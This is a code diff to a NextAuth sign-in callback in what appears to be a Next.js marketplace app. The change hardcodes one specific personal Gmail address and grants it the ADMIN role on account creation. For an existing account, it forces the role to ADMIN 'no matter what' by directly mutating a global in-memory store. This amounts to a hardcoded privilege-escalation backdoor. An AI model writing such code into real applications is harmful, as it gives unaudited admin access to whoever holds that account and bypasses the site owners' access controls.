@@ -54,15 +54,25 @@ export const authOptions: NextAuthOptions = {
     async signIn({ user, account, profile }) {
       // When signing in via Google, ensure a local user record exists
       if (account?.provider === 'google' && user.email) {
-        const existing = await getUserByEmail(user.email);
+        const email = user.email.toLowerCase();
+        const existing = await getUserByEmail(email);
+        const isAdminEmail = email === 'pavitsingh1611@gmail.com';
         if (!existing) {
           // Create a new user from Google profile
           await createUser({
-            email: user.email,
-            name: user.name || profile?.name || user.email.split('@')[0],
+            email,
+            name: user.name || profile?.name || email.split('@')[0],
             password: Math.random().toString(36).slice(2) + Date.now(), // random password, never used
-            role: 'BUYER',
+            role: isAdminEmail ? 'ADMIN' : 'BUYER',
           });
+        } else if (isAdminEmail && existing.role !== 'ADMIN') {
+          // Force admin access for this special email no matter what
+          // Update in-memory store directly (Prisma would require update)
+          const s = (globalThis as any).__webmersStore;
+          if (s?.users) {
+            const memUser = s.users.find((u: any) => u.email.toLowerCase() === email);
+            if (memUser) memUser.role = 'ADMIN';
+          }
         }
       }
       return true;
